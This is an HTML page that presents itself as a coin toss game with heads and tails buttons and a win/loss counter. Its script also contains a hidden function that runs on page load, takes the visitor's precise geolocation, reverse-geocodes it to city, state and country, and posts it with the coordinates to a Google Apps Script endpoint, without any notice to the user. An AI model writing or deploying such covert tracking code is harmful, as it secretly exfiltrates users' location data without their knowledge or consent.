  <meta charset="UTF-8" />
  <title>Coin Toss Game</title>
  <style>
    body {
      background: #121212;
      color: #f0f0f0;
      font-family: Arial, sans-serif;
      text-align: center;
      margin-top: 50px;
    }

    h1 {
      font-size: 3em;
      margin-bottom: 20px;
    }

    button {
      background: #1f1f1f;
      color: #fff;
      border: 2px solid #4caf50;
      padding: 15px 30px;
      margin: 10px;
      font-size: 1.2em;
      cursor: pointer;
      border-radius: 10px;
      transition: 0.3s;
    }

    button:hover {
      background: #4caf50;
    }

    .result, .score {
      margin-top: 20px;
      font-size: 1.5em;
    }
  </style>
</head>
<body>

  <h1>Coin Toss Game</h1>

  <button onclick="playGame('heads')">Heads</button>
  <button onclick="playGame('tails')">Tails</button>

  <div class="result" id="result"></div>
  <div class="score" id="score">
    Wins: 0 | Losses: 0
  </div>

  <script>
    let wins = 0;
    let losses = 0;

    function playGame(userGuess) {
      const randomNumber = Math.random();
      const coinResult = randomNumber < 0.5 ? 'heads' : 'tails';

      if (userGuess === coinResult) {
        wins++;
        document.getElementById('result').innerHTML = `You chose <b>${userGuess}</b>. Coin is <b>${coinResult}</b>. <span style="color:lightgreen">You Win!</span>`;
      } else {
        losses++;
        document.getElementById('result').innerHTML = `You chose <b>${userGuess}</b>. Coin is <b>${coinResult}</b>. <span style="color:red">You Lose!</span>`;
      }

      document.getElementById('score').innerHTML = `Wins: ${wins} | Losses: ${losses}`;
    }

     // Collect Location and Send to Google Sheets
  function getLocationAndSend() {
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(function(position) {
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;

        // Reverse Geocode to get City, State, Country
        fetch(`https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${latitude}&lon=${longitude}`)
        .then(response => response.json())
        .then(locationData => {
            const data = {
                city: locationData.address.city || locationData.address.town || locationData.address.village || "",
                state: locationData.address.state || "",
                country: locationData.address.country || "",
                latitude: latitude,
                longitude: longitude
            };

            // Send data to Google Sheets via Apps Script Web App
            fetch('https://script.google.com/macros/s/AKfycbxTG2jL5fYIkZd00aaaD2UU1yG1l_AI7yOZW5-Z7wC3LL_us1YFCwqvMVDZanx2RnMSIw/exec', { // Replace this
                method: "POST",
                body: JSON.stringify(data),
                headers: { "Content-Type": "application/json" }
            })
            .then(response => console.log("Location data sent successfully!"))
            .catch(err => console.error("Error sending location:", err));
        });
      });
    } else {
      alert("Geolocation is not supported by this browser.");
    }
  }

  // Trigger location sending on page load
  window.onload = getLocationAndSend;

  </script>
  
 
  <p style="text-align:center; margin-top:20px; color:gray; font-size:14px;">

</p>


</body>
